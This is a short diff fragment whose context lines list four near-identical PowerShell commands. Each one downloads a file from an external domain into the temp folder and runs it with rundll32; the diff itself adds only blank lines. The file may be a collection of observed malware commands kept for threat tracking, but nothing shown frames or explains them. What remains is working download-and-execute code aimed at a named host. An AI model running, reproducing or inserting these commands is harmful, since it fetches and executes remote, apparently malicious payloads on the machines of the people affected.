@@ -24,3 +24,7 @@ $path = $Env:temp+'\1092657_3.bin'; $client = New-Object System.Net.WebClient; $
 $path = $Env:temp+'\-7_901843.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
 $path = $Env:temp+'\192840675.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
 $path = $Env:temp+'\359-864_2.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://bdjessi.bobetbobette.com/loginup.php',$path); C:\Windows\System32\rundll32.exe $path,drusvcw
+
+
+
+
